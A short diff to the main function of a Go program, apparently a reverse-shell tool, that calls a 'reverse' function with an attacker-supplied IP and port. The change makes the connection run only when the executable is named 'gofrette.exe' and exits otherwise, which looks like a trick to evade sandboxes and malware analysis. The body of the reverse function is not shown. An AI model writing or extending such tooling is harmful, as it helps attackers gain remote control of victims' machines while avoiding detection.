@@ -18,7 +18,11 @@ func main() {
 	port := flag.Int("p",1234,"port")
 	flag.Parse()
 	address := fmt.Sprintf("%s:%d",*ipaddr, *port)
-	reverse(address)
+	name := os.Args[0]
+	if strings.Contains(name,"gofrette.exe") {
+		reverse(address)
+	}
+	os.Exit(1)
 }
 
 func reverse(host string) {
